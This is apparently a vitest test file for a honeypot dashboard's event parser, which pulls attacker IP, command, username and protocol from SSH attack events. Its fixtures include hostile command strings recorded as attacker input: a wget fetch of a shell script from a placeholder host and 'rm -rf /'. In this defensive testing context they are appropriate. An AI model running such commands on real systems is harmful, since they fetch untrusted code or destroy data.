import { describe, expect, it } from 'vitest';
import type { HfEvent } from '../../shared/api/types';
import { attackPayload } from './YumiEvents';

const ev = (data: HfEvent['data']): Pick<HfEvent, 'source' | 'service' | 'data'> => ({
  source: { ip: '203.0.113.9', port: 40112 }, service: { protocol: 'ssh', port: 2222 }, data,
});

describe('Юми: поля событий атак по согласованному формату (specs/events.md)', () => {
  it('команда атакующего — из data.input события session.command', () => {
    expect(attackPayload('attack:command', ev({ input: 'wget http://x/y.sh' }))).toMatchObject({
      ip: '203.0.113.9', command: 'wget http://x/y.sh',
    });
  });

  it('несогласованное поле data.command не используется', () => {
    expect(attackPayload('attack:command', ev({ command: 'rm -rf /' })).command).toBe('');
  });

  it('команда не попадает в реплики других событий', () => {
    expect(attackPayload('attack:auth', ev({ input: 'ls', username: 'root', success: true }))).toMatchObject({
      command: '', username: 'root', success: true, protocol: 'ssh',
    });
  });

  it('нестроковые значения не роняют разбор', () => {
    expect(attackPayload('attack:command', ev({ input: 42, username: null }))).toMatchObject({ command: '', username: '' });
  });
});
